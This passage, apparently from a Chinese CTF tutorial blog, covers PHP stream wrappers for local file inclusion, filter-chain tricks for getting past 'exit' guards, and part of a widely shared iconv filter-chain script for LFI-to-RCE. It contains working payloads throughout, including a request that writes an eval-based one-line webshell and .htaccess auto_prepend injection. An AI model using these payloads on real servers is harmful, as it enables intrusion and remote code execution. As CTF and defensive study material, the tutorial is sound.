<li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径。</p>
</li>
<li><p><strong>用法</strong>：</p>
<pre><code class="highlight pgsql">/<span class="type">path</span>/<span class="keyword">to</span>/file.ext
relative/<span class="type">path</span>/<span class="keyword">to</span>/file.ext
fileInCwd.ext
C:/<span class="type">path</span>/<span class="keyword">to</span>/winfile.ext
C:\<span class="type">path</span>\<span class="keyword">to</span>\winfile.ext
\\smbserver\<span class="keyword">share</span>\<span class="type">path</span>\<span class="keyword">to</span>\winfile.ext
file:///<span class="type">path</span>/<span class="keyword">to</span>/file.ext</code></pre>
</li>
<li><p><strong>示例</strong>：</p>
<ol>
<li><p><code>file://[文件的绝对路径和文件名]</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQAZ" alt="图片描述"></p>
</li>
<li><p><code>[文件的相对路径和文件名]</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=./phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQA1" alt="图片描述"></p>
</li>
<li><p><code>[http：//网络路径和文件名]</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBb" alt="图片描述"></p>
</li>
</ol>
</li>
<li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=YtcHVUno34rLTBJUcxsHxA==.SAMo1ZcMmiqVqJxFosbgOTO2nJi4mSvGX5no8jrMTl7u2z1qAxlTLJm6Xm7Rs3Ze">http://php.net/manual/zh/wrappers.file.php</a></p>
</li>
</ul>
<h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a><code>php://</code> 协议</h3><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:off&#x2F;on</li>
<li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</li>
</ul>
</li>
<li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
</li>
<li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
<table>
<thead>
<tr>
<th>协议</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>php:&#x2F;&#x2F;input</td>
<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;output</td>
<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;fd</td>
<td>(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp</td>
<td>(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;filter</td>
<td>(&gt;&#x3D;5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
</tr>
</tbody></table>
</li>
<li><p><strong><code>php://filter</code>参数详解</strong></p>
<p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
<table>
<thead>
<tr>
<th>php:&#x2F;&#x2F;filter 参数</th>
<th>描述</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
<td>必须项。它指定了你要筛选过滤的数据流。</td>
<td></td>
</tr>
<tr>
<td>read&#x3D;&lt;读链的过滤器&gt;</td>
<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
<td>*）分隔。</td>
</tr>
<tr>
<td>write&#x3D;&lt;写链的过滤器&gt;</td>
<td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
<td>）分隔。</td>
</tr>
<tr>
<td>&lt;; 两个链的过滤器&gt;</td>
<td>任何没有以 <em>read&#x3D;</em> 或 <em>write&#x3D;</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
<td></td>
</tr>
</tbody></table>
</li>
<li><p><strong>可用的过滤器列表（4类）</strong></p>
<p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://link.segmentfault.com/?enc=XLl1qyeGwRWWMG9dw9ESmQ==.0ts2nAacIjZZ+DTLJ5T0ocshPXAgZLYKgYBybI8Dc7yazO2QRQTOjf/jsO5rq19t">https://www.php.net/manual/zh/filters.php</a></p>
<table>
<thead>
<tr>
<th>字符串过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>string.rot13</td>
<td>等同于<code>str_rot13()</code>，rot13变换</td>
</tr>
<tr>
<td>string.toupper</td>
<td>等同于<code>strtoupper()</code>，转大写字母</td>
</tr>
<tr>
<td>string.tolower</td>
<td>等同于<code>strtolower()</code>，转小写字母</td>
</tr>
<tr>
<td>string.strip_tags</td>
<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>转换过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>convert.base64-encode &amp; convert.base64-decode</td>
<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
</tr>
<tr>
<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>压缩过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>zlib.deflate &amp; zlib.inflate</td>
<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
</tr>
<tr>
<td>bzip2.compress &amp; bzip2.decompress</td>
<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>加密过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>mcrypt.*</td>
<td>libmcrypt 对称加密算法</td>
</tr>
<tr>
<td>mdecrypt.*</td>
<td>libmcrypt 对称解密算法</td>
</tr>
</tbody></table>
</li>
<li><p><strong>示例</strong>：</p>
<ol>
<li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>
<pre><code class="highlight livecodeserver"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="built_in">include</span>.php?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=phpinfo.php</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBf" alt="图片描述"></p>
</li>
<li><p><code>php://input + [POST DATA]</code>执行php代码</p>
<pre><code class="highlight php">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span>
[POST DATA部分]
<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBh" alt="图片描述"></p>
<p>若有写入权限，写入一句话木马</p>
<pre><code class="highlight php">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span>
[POST DATA部分]
<span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;1juhua.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBi" alt="图片描述"></p>
</li>
</ol>
</li>
<li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=AHKgds+Ge0QaKChQ1m1oog==.na4Zlt5y4duEWHHydmOSTh2NkSbiDQNUtTreUgqxsETwe3g04SdnSBMCMdEdQ27X">https://php.net/manual/zh/wrappers.php.php</a></p>
</li>
</ul>
<h3 id="zip-bzip2-zlib-协议"><a href="#zip-bzip2-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a><code>zip:// &amp; bzip2:// &amp; zlib://</code> 协议</h3><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:off&#x2F;on</li>
<li><code>allow_url_include</code> :off&#x2F;on</li>
</ul>
</li>
<li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p>
</li>
<li><p><strong>示例</strong>：</p>
<ol>
<li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p>
<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBj" alt="图片描述"></p>
</li>
<li><p><code>compress.bzip2://file.bz2</code></p>
<p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBt" alt="图片描述"></p>
</li>
<li><p><code>compress.zlib://file.gz</code></p>
<p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBu" alt="图片描述"></p>
</li>
</ol>
</li>
<li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=w0uak4RdRJUStEHdEK6h4w==.xhWZ9YsBZncXK/YcM6ZNJ5Jey44TQSRRDG2PDhW+VOCrc/wcHb6xJoP7Fff88EcMBe0t2zuSqAZeW77CzMA4ZQ==">http://php.net/manual/zh/wrappers.compression.php</a></p>
</li>
</ul>
<h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a><code>data://</code> 协议</h3><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:on</li>
<li><code>allow_url_include</code> :on</li>
</ul>
</li>
<li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
</li>
<li><p><strong>用法</strong>：</p>
<pre><code class="highlight dts"><span class="symbol">data:</span><span class="comment">//text/plain,</span>
<span class="symbol">data:</span><span class="comment">//text/plain;base64,</span></code></pre>
</li>
<li><p><strong>示例</strong>：</p>
<ol>
<li><p><code>data://text/plain,</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBB" alt="图片描述"></p>
</li>
<li><p><code>data://text/plain;base64,</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBD" alt="图片描述"></p>
</li>
</ol>
</li>
</ul>
<h3 id="http-https-协议"><a href="#http-https-协议" class="headerlink" title="http:// &amp; https:// 协议"></a><code>http:// &amp; https://</code> 协议</h3><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:on</li>
<li><code>allow_url_include</code> :on</li>
</ul>
</li>
<li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p>
</li>
<li><p><strong>用法</strong>：</p>
<pre><code class="highlight dts"><span class="symbol">http:</span><span class="comment">//example.com</span>
<span class="symbol">http:</span><span class="comment">//example.com/file.php?var1=val1&amp;var2=val2</span>
<span class="symbol">http:</span><span class="comment">//user:password@example.com</span>
<span class="symbol">https:</span><span class="comment">//example.com</span>
<span class="symbol">https:</span><span class="comment">//example.com/file.php?var1=val1&amp;var2=val2</span>
<span class="symbol">https:</span><span class="comment">//user:password@example.com</span></code></pre>
</li>
<li><p><strong>示例</strong>：</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBP" alt="图片描述"></p>
</li>
</ul>
<h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a><code>phar://</code> 协议</h3><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBX" alt="图片描述"></p>
<p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar:&#x2F;&#x2F;协议对象注入技术</strong>。</p>
<p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p>
<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><h3 id="filter链绕过"><a href="#filter链绕过" class="headerlink" title="filter链绕过"></a>filter链绕过</h3><p>构造一串字符利用过滤器的性质构造(在已知文件前构造命令执行)或破坏字符(exit)</p>
<h4 id="base64特质"><a href="#base64特质" class="headerlink" title="base64特质"></a>base64特质</h4><p>在base64_decode中会将不在A-Za-z0-9+&#x2F;&#x3D;的字符全都去掉，于是可以通过这个来绕过exit</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326161257630.png" alt="image-20250326161257630"></p>
<p>乍一眼，你这不对啊。。。。这是因为base64在解码的时候是将4个字节转化为3个字节，又因为死亡代码只有phpexit参与了解码，所以补上一位就可以完全转化，解码的时候有效字符一定要是4的倍数，不然就会解码错误，原因就是未补足的字符本质上是用&#x3D;补足的</p>
<p>而在解码时&#x3D;后还有字符明显是错误的，所以就会注入失败</p>
<h4 id="rot13-编码绕过"><a href="#rot13-编码绕过" class="headerlink" title="rot13 编码绕过"></a><strong>rot13 编码绕过</strong></h4><p>原理和base64一样，可以直接转码分解死亡代码；这里不再多说；直接看如下实验结果即可；</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326161910851.png" alt="image-20250326161910851"></p>
<p>只是这种方法有点尴尬的是；因为我们生成的文件内容之中前面的<code>&lt;?</code>并没有分解掉，这时，如果服务器开启了短标签(short_open_tag)，那么就会被解析，所以所以后面的代码就会错误；也就失去了作用；</p>
<h4 id="htaccess的预包含利用"><a href="#htaccess的预包含利用" class="headerlink" title=".htaccess的预包含利用"></a><strong><code>.htaccess</code>的预包含利用</strong></h4><p>利用 <code>.htaccess</code>的预包含文件的功能来进行攻破；自定义包含我们的flag文件。</p>
<pre><code class="highlight plaintext">$filename=php://filter/write=string.strip_tags/resource=.htaccess

$content=?&gt;php_value%20auto_prepend_file%20G:\s1mple.php</code></pre>

<p>同时传入如上的代码，首先来解释$filename的代码，这里引用了<code>string.strip_tags</code>过滤器，可以过滤.htaccess内容的html标签，自然也就消除了死亡代码；$content即闭合死亡代码使其完全消除，并且写入自定义包含文件；实验结果如下所示：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326162057074.png" alt="image-20250326162057074"></p>
<p>但是这种方法也是具有一定的局限性，首先我们需要知道flag文件的位置，和文件的名字，一般的比赛中可以盲猜 <code>flag.php flag /flag /flag.php</code> 等等；另外还有个很大的问题是，<code>string.strip_tags</code>过滤器只是可以在php5的环境下顺利的使用，如果题目环境是在php7.3.0以上的环境下，则会发生段错误。导致写不进去；根本来说是php7.3.0中废弃了string.strip_tags这个过滤器；</p>
<h4 id="蓄意乱序"><a href="#蓄意乱序" class="headerlink" title="蓄意乱序"></a>蓄意乱序</h4><p>介绍UCS-2LE和UCS-2BE两种过滤器的组合以及UCS-4LE和UCS-2BE两种过滤器的组合</p>
<p>其中2xE都是进行两位一反转，4xE进行四位一反转，目的其实就是破坏前面死亡exit的顺序来达到让php无法识别的效果</p>
<h4 id="过滤器编码组合拳"><a href="#过滤器编码组合拳" class="headerlink" title="过滤器编码组合拳"></a><strong>过滤器编码组合拳</strong></h4><p>过滤器组合拳，其实故名思意，就是利用过滤器嵌套过滤器进行过滤，以此达到代码的层层更迭，从而最后写入我们期望的代码；</p>
<p><strong>先来一种：</strong></p>
<pre><code class="highlight plaintext">$filename=&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=s1mple.php&#x27;
$content=&#x27;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</code></pre>

<p>可以看到，利用string.strip_tags可以过滤掉html标签，将<strong>标签内的所有内容进行删去</strong>，然后再进行base64解码，成功写入shell；</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326162042101.png" alt="image-20250326162042101"></p>
<p>但是这种方法有一定的局限性也还是因为string.strip_tags在php7.3.0以上的环境下会发生段错误，从而导致无法写入，但是在php5的环境下则不受此影响；</p>
<p><strong>再来另外一种</strong></p>
<p>如果题目的环境是php7的话，那么我们又该如何？这里受一个题目的启发，也可以使用过滤器进行嵌套来做；组合拳；这里三个过滤器叠加之后先进行压缩，然后转小写，最后解压，会导致部分死亡代码错误；则可以写入shell；</p>
<pre><code class="highlight plaintext">$filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=s1mple.php
$content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=s1mple.php</code></pre>

<p>如此便可以写入；其原理也很简单，就是利用过滤器嵌套让死亡代码在各种变换之间进行分解扰乱，然后再次写入木马；</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250326162048585.png" alt="image-20250326162048585"></p>
<p>这里非常巧合的是内容经过压缩转小写然后解压之后，我们的目的代码并没有发生变化，这也为写入木马奠定了基础；</p>
<h4 id="无中生有之inconv"><a href="#无中生有之inconv" class="headerlink" title="无中生有之inconv"></a>无中生有之inconv</h4><p>呃呃，又长又臭的脚本环节，只讲一下原理吧，脚本还是要等我的XSS三兄弟学完才会回头补完一下。。</p>
<p>主包讲的不好也可以参考p神的博客<a href="https://err0r233.github.io/posts/28510.html">真正的from LFI to RCE——CVE-2024-2961 | Err0r233</a></p>
<p>从上面已经知道我们可以利用base64解码的特质和strip_tags来删除掉一些过滤</p>
<p>那有的人会说了，主包主包你的混淆确实很强，但是如何他的注入点干净的不得了呢</p>
<pre><code class="highlight php"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];
<span class="keyword">include</span>(<span class="variable">$a</span>);</code></pre>

<p>这个时候就需要自行构造一些危险代码，同时利用base64将其先编码防止诸如<code>&lt;?;&gt;</code>这些字符在解码时被过滤掉</p>
<p>所以要介绍一些神奇的过滤器:</p>
<ul>
<li>CSISO2022KR</li>
</ul>
<p>将字符集从我们常用的<code>UTF-8</code>转换为<code>CSISO2022KR</code></p>
<pre><code class="highlight php">php:<span class="comment">//filter/convert.iconv.UTF8.CSISO2022KR/resource=data://,aaaaaaaaaaaaaa</span>
转换结果：
<span class="keyword">string</span>(<span class="number">24</span>) <span class="string">&quot;%1B%24%29Caaaaaaaaaaaaaa&quot;</span>

其实是 <span class="keyword">string</span>(<span class="number">18</span>) <span class="string">&quot;不可见字符$)Caaaaaaaaaaaaaa&quot;</span></code></pre>

<p>此时可以看到成功构造了一个字符C</p>
<p>达到了无中生有的效果了</p>
<p>而通过几次巧妙的构造，就可以出整张base64表，这里直接贴p神搓好的脚本</p>
<pre><code class="highlight python"><span class="comment">#!/usr/bin/env python3</span>
<span class="keyword">import</span> argparse
<span class="keyword">import</span> base64
<span class="keyword">import</span> re

<span class="comment"># - Useful infos -</span>
<span class="comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span>
<span class="comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span>
<span class="comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span>

<span class="comment"># No need to guess a valid filename anymore</span>
file_to_use = <span class="string">&quot;php://temp&quot;</span>

conversions = &#123;
    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2&#x27;</span>,
    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,
    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,
    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,
    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x27;</span>,
    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2&#x27;</span>,
    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,
    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;</span>,
    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,
    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,
    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,
    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,
    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,
    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,
    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,
    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5&#x27;</span>,
    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,
    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,
    <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,
    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,
    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,
    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,
    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,
    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,
    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,
    <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,
    <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,
    <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,
    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,
    <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,
    <span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,
    <span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,
    <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,
    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,
    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,
